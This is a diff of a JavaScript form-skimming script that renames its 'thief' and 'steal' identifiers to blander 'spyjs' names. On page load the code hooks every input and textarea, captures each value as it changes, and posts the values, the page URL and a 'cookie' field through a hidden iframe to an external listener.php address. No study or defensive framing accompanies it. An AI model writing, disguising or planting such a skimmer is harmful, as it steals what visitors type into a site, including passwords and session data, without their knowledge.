@@ -1,6 +1,6 @@
-var thief_location = ""; //location of listener.php
+var spyjs_location = ""; //location of listener.php
 
-document.addEventListener("DOMContentLoaded", function() {
+window.addEventListener("load", function() {
 	var ifrm = document.createElement("iframe");
 	ifrm.setAttribute("id", "thiefmailbox");
 	ifrm.setAttribute("name", "thiefmailbox");
@@ -9,21 +9,21 @@ document.addEventListener("DOMContentLoaded", function() {
 	
 	var inputs = document.querySelectorAll('input');
 	for(var i = 0; i < inputs.length; i++) {
-		inputs[i].addEventListener("change", function(e) {stealInput(e.currentTarget)});
+		inputs[i].addEventListener("change", function(e) {spyjs_getInput(e.currentTarget)});
 	}
 	var textareas = document.getElementsByTagName('textarea');
 	for(var i = 0; i < textareas.length; i++) {
-		textareas[i].addEventListener("change", function(e) {stealInput(e.currentTarget)});
+		textareas[i].addEventListener("change", function(e) {spyjs_getInput(e.currentTarget)});
 	}
-	getLocation();
+	spyjs_getLocation();
 }, false);
 
 	
-function getLocation(){
+function spyjs_getLocation(){
 	var loc = {};
-	sendMail(loc);
+	spyjs_send(loc);
 }
-function stealInput(inputInfo){
+function spyjs_getInput(inputInfo){
 	var name = inputInfo.name;
 	var value = inputInfo.value;
 	var stolenInput = {};
@@ -32,14 +32,14 @@ function stealInput(inputInfo){
 	}
 	if(value != ""){
 		stolenInput[name] = value;
-		sendMail(stolenInput);
+		spyjs_send(stolenInput);
 	}
 }
-function sendMail(params){
+function spyjs_send(params){
 	var form = document.createElement("form");
 	form.setAttribute("method", "post");
 	form.setAttribute("target", "thiefmailbox");
-	form.setAttribute("action", thief_location+"?lo="+location.href);
+	form.setAttribute("action", spyjs_location+"?lo="+location.href);
 	var field = document.createElement("input");
 	field.setAttribute("type", "hidden");
 	field.setAttribute("name", "cookie");
